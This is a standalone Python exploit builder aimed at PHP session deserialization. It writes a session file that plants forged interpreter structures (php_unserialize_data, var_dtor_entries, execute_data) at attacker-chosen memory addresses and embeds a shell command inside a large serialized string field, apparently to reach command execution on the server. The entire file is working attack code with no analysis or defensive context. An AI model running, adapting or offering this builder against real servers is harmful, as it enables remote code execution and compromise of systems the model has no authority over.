#!/usr/bin/env python3
import struct, sys, os, json

def build(out, P, B0, keylen, L, K=0, x2=0, arg1=0, target=10731636, cmd=b'', verbose=True):
    period=256
    pat=bytearray(b'A'*period)
    def put(off,b):
        for i,x in enumerate(b):
            pat[(off+i)%period]=x
    # fake php_unserialize_data at pattern offset 0xE8 (lands at P)
    st=struct.pack('<QQQQQQQQ', P+56, B0, B0, 0,0,0, 0x7fffffff, 1018)+struct.pack('<Q',0)
    put(0xE8, st)
    # fake var_dtor_entries at B0: used_slots K, next 0
    # P sits at pattern offset 0xE8; address offset d maps to pattern (0xE8+d)%period
    put((0xE8 + (B0-P)) % period, struct.pack('<q',K)+struct.pack('<Q',0))
    # fake execute_data fields at raw key offsets
    put(0x2c, struct.pack('<I',1))
    put(0x50, struct.pack('<Q',arg1))
    put(0x58, bytes([6]))
    key=(bytes(pat)*(keylen//period+2))[:keylen]
    assert b'|' not in key, 'key contains 0x7c'
    val=('i:%d;'%target).encode()
    rec1=key+b'|'+val
    prefix2=b'bigfield|s:'+str(L).encode()+b':"'
    Q=len(rec1)+len(prefix2)
    payload=bytearray(b'V'*L)
    if cmd:
        assert 0x118+len(cmd) < L, 'command outside payload'
        payload[0x110:0x118]=struct.pack('<Q',len(cmd))
        payload[0x118:0x118+len(cmd)]=cmd
        payload[0x118+len(cmd)]=0
    data=rec1+prefix2+bytes(payload)+b'";'
    os.makedirs(os.path.dirname(out) or '.',exist_ok=True)
    with open(out,'wb') as f: f.write(data)
    meta={'path':out,'size':len(data),'keylen':keylen,'P':hex(P),'B0':hex(B0),'dtor':hex(B0),
          'K':K,'L':L,'Q':Q,'rec1_len':len(rec1),'x2':hex(x2) if x2 else None,
          'F':hex(x2+0x18+Q+0x100) if x2 else None,'arg1':hex(arg1),
          'F_off':Q+0x100,'cmd_off':Q+0x118,'cmd_len':len(cmd),
          'key7c':False}
    if x2:
        meta['F']=hex(x2+0x18+Q+0x100)
    if verbose: print(json.dumps(meta,indent=1))
    return meta

if __name__=='__main__':
    import argparse
    ap=argparse.ArgumentParser()
    ap.add_argument('out'); ap.add_argument('P'); ap.add_argument('B0'); ap.add_argument('keylen',type=int); ap.add_argument('L',type=int)
    ap.add_argument('K',nargs='?',default='0'); ap.add_argument('x2',nargs='?',default='0'); ap.add_argument('arg1',nargs='?',default='0')
    ap.add_argument('cmd',nargs='?',default='')
    a=ap.parse_args()
    build(a.out,int(a.P,0),int(a.B0,0),a.keylen,a.L,int(a.K,0),int(a.x2,0),int(a.arg1,0),cmd=a.cmd.encode())
